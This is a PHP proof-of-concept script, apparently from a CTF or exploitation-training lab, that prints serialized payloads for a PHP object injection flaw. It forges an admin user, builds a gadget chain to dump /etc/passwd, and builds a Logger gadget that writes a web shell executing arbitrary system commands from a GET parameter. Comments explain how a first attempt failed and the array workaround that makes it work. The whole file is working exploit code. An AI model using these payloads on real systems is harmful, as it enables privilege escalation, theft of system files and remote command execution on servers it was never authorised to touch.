<?php

//Logger.php
class Logger {
    public $filename;
    public $msg;

    public function __construct($filename="", $msg="") {
        $this->filename = $filename;
        $this->msg = $msg;
    }
}
//ReadFile.php
class ReadFile {
    public function __construct($filename) {
        $this->filename = $filename;
    }
}
//User.php
class User {
    public $username;
    public $isAdmin;

    public function __construct($username="", $isAdmin="") {
        $this->username = $username;
        $this->isAdmin = $isAdmin;
    }
}

//Forge an admin user
echo "Payload for forcing admin\n";
$obj = new User();
$obj->username = "nikos";
$obj->isAdmin = TRUE;
echo serialize($obj) . "\n\n";

//Lets dump the file: /etc/passwd
echo "Payload for dumping file '/etc/passwd'\n";
$obj = new User();
$obj->username = new ReadFile("/etc/passwd");
$obj->isAdmin = TRUE;
echo serialize($obj) . "\n\n";

//Lets create a file called 'malicious.php', which when interpreted by the PHP server, executes arbitrary system commands
echo "Payload for creating arbitrary files: \n";

//The bellow will NOT work, it fails with message:
//PHP Catchable fatal error:  Object of class Logger could not be converted to string in /home/nikos/ctf/exploitation-training/network-exploitation/POCs/php-object-injection/vuln-server.php on line 22
//And it is right, since Logger has no "__tostring()" magic method
/*
$obj = new User(
    new Logger( //username
        '/home/nikos/ctf/exploitation-training/network-exploitation/POCs/php-object-injection/malicious.php', //filename
        '<?php if($_GET["cmd"]) system($_GET["cmd"]); ?>'   //file contents
    ),
    TRUE //isAdmin
);
*/

//As a workaround, we will change the username type to array and then insert the logger as an element to the array
$logger = new Logger( //username
    '/home/nikos/ctf/exploitation-training/network-exploitation/POCs/php-object-injection/malicious.php', //filename
    '<?php if($_GET["cmd"]) system($_GET["cmd"]); exit(0); ?>'   //file contents
);

$obj = new User();
$obj->username = array();
$obj->username[0] = $logger;
$obj->isAdmin = TRUE;
echo serialize($obj) . "\n\n";
